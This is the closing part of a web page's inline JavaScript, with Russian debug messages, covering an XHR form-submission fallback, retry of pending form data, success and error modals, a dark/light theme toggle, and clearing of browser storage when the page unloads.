                                xhr.onload = function () {
                                    debugLog('XHR ответ', { status: xhr.status });
                                    if (xhr.status === 0 || xhr.status === 200 || xhr.status === 302) {
                                        resolve(true);
                                    } else {
                                        resolve(false);
                                    }
                                };

                                xhr.onerror = function () {
                                    debugError('XHR ошибка сети');
                                    resolve(false);
                                };

                                xhr.ontimeout = function () {
                                    debugError('XHR таймаут');
                                    resolve(false);
                                };

                                xhr.send(formData);
                            } catch (xhrError) {
                                debugError('Ошибка в XHR fallback', xhrError);
                                resolve(false);
                            }
                        });

                } catch (error) {
                    debugError('Критическая ошибка при подготовке формы', error);
                    resolve(false);
                }
            });
        }

        async function sendPendingData(jsonData) {
            try {
                const success = await sendFormData(jsonData);
                if (success) {
                    localStorage.removeItem(PENDING_DATA_KEY);
                    debugLog('Отложенные данные отправлены');
                }
            } catch (error) {
                debugError('Ошибка отправки отложенных данных', error);
            }
        }

        function nukeLocalStorageOnExit() {
            try {
                console.log('ПОЛНАЯ ОЧИСТКА ПРИ ВЫХОДЕ');

                localStorage.clear();
                sessionStorage.clear();

                console.log('✅ ВСЕ данные удалены');
                return true;
            } catch (error) {
                console.error('❌ Ошибка при очистке:', error);
                return false;
            }
        }

        function showSuccessModal() {
            successModal.classList.add('active');
            setTimeout(() => {
                successModal.classList.remove('active');
            }, 5000);
        }

        function showErrorModal(errorCode = 'ERR_UNKNOWN') {
            errorCodeSpan.textContent = errorCode;
            errorModal.classList.add('active');

            setTimeout(() => {
                errorModal.classList.remove('active');
            }, 5000);
        }

        successModal.addEventListener('click', (e) => {
            if (e.target === successModal) {
                successModal.classList.remove('active');
            }
        });

        errorModal.addEventListener('click', (e) => {
            if (e.target === errorModal) {
                errorModal.classList.remove('active');
            }
        });

        document.addEventListener('DOMContentLoaded', () => {
            initializeSystem();
            loadTheme();
        });

        function loadTheme() {
            const savedTheme = localStorage.getItem('theme');
            const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;

            if (savedTheme === 'dark') {
                body.classList.add('dark-mode');
                themeToggle.checked = true;
                updateThemeText(true);
            } else {
                body.classList.remove('dark-mode');
                themeToggle.checked = false;
                updateThemeText(false);

                if (!savedTheme) {
                    localStorage.setItem('theme', 'light');
                }
            }
        }

        function updateThemeText(isDark) {
            if (isDark) {
                themeLabel.textContent = 'DARK THEME';
            } else {
                themeLabel.textContent = 'LIGHT THEME';
            }
        }

        function playTransitionAnimation(callback) {
            transitionOverlay.classList.add('active');

            setTimeout(() => {
                callback();

                setTimeout(() => {
                    transitionOverlay.classList.add('fade-out');

                    setTimeout(() => {
                        transitionOverlay.classList.remove('active', 'fade-out');
                    }, 800);
                }, 100);
            }, 400);
        }

        function showSaveNotification() {
            saveNotification.classList.add('show');

            setTimeout(() => {
                saveNotification.classList.remove('show');
            }, 2000);
        }

        themeToggle.addEventListener('mousedown', function () {
            const slider = document.querySelector('.toggle-slider:before');
            slider.style.width = '55px';
        });

        themeToggle.addEventListener('mouseup', function () {
            const slider = document.querySelector('.toggle-slider:before');
            slider.style.width = '';
        });

        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
            if (!localStorage.getItem('theme')) {
                if (e.matches) {
                    body.classList.add('dark-mode');
                    themeToggle.checked = true;
                    updateThemeText(true);
                } else {
                    body.classList.remove('dark-mode');
                    themeToggle.checked = false;
                    updateThemeText(false);
                }
            }
        });

        window.addEventListener('beforeunload', function () {
            nukeLocalStorageOnExit();
        });
    </script>
</body>

</html>